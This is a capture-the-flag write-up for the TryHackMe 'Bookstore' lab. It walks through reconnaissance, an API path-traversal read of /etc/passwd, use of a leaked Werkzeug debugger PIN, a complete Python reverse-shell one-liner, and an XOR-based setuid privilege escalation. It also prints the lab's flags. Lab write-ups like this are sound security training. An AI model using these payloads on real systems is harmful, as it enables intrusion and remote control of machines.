# TryHackMe - Bookstore Penetration Testing Writeup

This document provides a detailed writeup on the penetration test performed on the Bookstore machine hosted on TryHackMe.

## **1. Initial Reconnaissance**

The first step of any penetration test is an initial scan to determine what services are running.

```bash
root@ip-10-10-183-17:~# nmap -sC -sV 10.10.14.108 
```

The key findings from the scan are:

- SSH (port 22) is open.
- HTTP (port 80) is serving an Apache server.
- Another HTTP instance (port 5000) is identified as the Werkzeug httpd, with an exposed API endpoint `/api`.

## **2. Web Enumeration**

Upon visiting the website at:

- `http://10.10.14.108`
- `http://10.10.14.108/books`
- `http://10.10.14.108/login`

We discovered interesting information:

- Source code of `/books` revealed an API call endpoint.
- A comment hinting at a version vulnerability in the API.
- The `/login` page had a development comment, indicating the presence of a debugger PIN in sid's bash history file.

To further uncover the directories and files, we used `gobuster`:

```bash
root@ip-10-10-183-17:~# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://10.10.14.108:5000
```

Discoveries:

- `/api` exposed API documentation.
- `/console` revealed the Werkzeug Debugger Console, but it required a PIN.

## **3. API Exploitation**

An exploration of the API exposed potential endpoints. To identify vulnerabilities, we fuzzed the API:

```bash
root@ip-10-10-183-17:~# wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -u http://10.10.14.108:5000/api/v1/resources/books?FUZZ=../../../../../etc/passwd --hc 404
```

This identified a potential local file disclosure vulnerability using the `show` parameter. Successfully exploiting it revealed the pin `123-321-135`.

## **4. Gaining Initial Access**

Utilizing the discovered PIN, we accessed the Werkzeug Debugger Console and executed the following command to obtain a reverse shell:

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.183.17",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

From the obtained shell, we extracted the user flag:

```bash
sid@bookstore:~$ cat user.txt
4ea65eb80ed441adb68246ddf7b964ab
```

## **5. Privilege Escalation**

On the server, a setuid binary named `try-harder` was discovered. After a local disassembly and reverse engineering, it was determined that the program performs an XOR operation against specific inputs.

### Disassembly of `try-harder` Binary

Upon disassembling the `try-harder` binary, we obtained the following assembly code for the main function:

```assembly
   0x00005555555547aa <+0>:    push   rbp
   0x00005555555547ab <+1>:    mov    rbp,rsp
   0x00005555555547ae <+4>:    sub    rsp,0x20
   0x00005555555547b2 <+8>:    mov    rax,QWORD PTR fs:0x28
   0x00005555555547bb <+17>:   mov    QWORD PTR [rbp-0x8],rax
   0x00005555555547bf <+21>:   xor    eax,eax
   0x00005555555547c1 <+23>:   mov    edi,0x0
   0x00005555555547c6 <+28>:   call   0x555555554680 <setuid@plt>
   0x00005555555547cb <+33>:   mov    DWORD PTR [rbp-0x10],0x5db3
   0x00005555555547d2 <+40>:   lea    rdi,[rip+0xfb]        # 0x5555555548d4
   0x00005555555547d9 <+47>:   call   0x555555554640 <puts@plt>
   0x00005555555547de <+52>:   lea    rax,[rbp-0x14]
   0x00005555555547e2 <+56>:   mov    rsi,rax
   0x00005555555547e5 <+59>:   lea    rdi,[rip+0x102]        # 0x5555555548ee
   0x00005555555547ec <+66>:   mov    eax,0x0
   0x00005555555547f1 <+71>:   call   0x555555554670 <__isoc99_scanf@plt>
   0x00005555555547f6 <+76>:   mov    eax,DWORD PTR [rbp-0x14]
   0x00005555555547f9 <+79>:   xor    eax,0x1116
   0x00005555555547fe <+84>:   mov    DWORD PTR [rbp-0xc],eax
   0x0000555555554801 <+87>:   mov    eax,DWORD PTR [rbp-0x10]
   0x0000555555554804 <+90>:   xor    DWORD PTR [rbp-0xc],eax
   0x0000555555554807 <+93>:   cmp    DWORD PTR [rbp-0xc],0x5dcd21f4
   0x000055555555480e <+100>:  jne    0x555555554823 <main+121>
```

Key observations:

1. The challenge's success criteria: Bypass the jump at `<+100>`.
```assembly
   0x000055555555480e <+100>:  jne    0x555555554823 <main+121>
```

2. A value `0x5db3 (23987)` is assigned to a variable at `rbp-0x10`.
```assembly
   0x00005555555547cb <+33>:   mov    DWORD PTR [rbp-0x10],0x5db3
```

3. User input is taken and XORed with `0x1116 (4374)` before being stored at `rbp-0xc`.
```assembly
   0x00005555555547f1 <+71>:   call   0x555555554670 <__isoc99_scanf@plt>
   0x00005555555547f6 <+76>:   mov    eax,DWORD PTR [rbp-0x14]
   0x00005555555547f9 <+79>:   xor    eax,0x1116
   0x00005555555547fe <+84>:   mov    DWORD PTR [rbp-0xc],eax
```

4. For a successful bypass, XORing the value at `rbp-0x10` with the result of our XORed input should match `0x5dcd21f4 (1573724660)`.
```assembly
   0x0000555555554801 <+87>:   mov    eax,DWORD PTR [rbp-0x10]
   0x0000555555554804 <+90>:   xor    DWORD PTR [rbp-0xc],eax
   0x0000555555554807 <+93>:   cmp    DWORD PTR [rbp-0xc],0x5dcd21f4
```

Resulting input calculation:
```
our_input = 0x5db3 ^ 0x1116 ^ 0x5dcd21f4 = 1573743953
```
or
```
our_input = 23987 ^ 4374 ^ 1573724660 = 1573743953
```

### Getting a root shell

Calculating the correct input granted us a root shell:

```bash
sid@bookstore:~$ ./try-harder 
What's The Magic Number?!
1573743953
root@bookstore:~#
```

With escalated privileges, we extracted the root flag:

```bash
root@bookstore:~# cat /root/root.txt
e29b05fba5b2a7e69c24a450893158e3
```
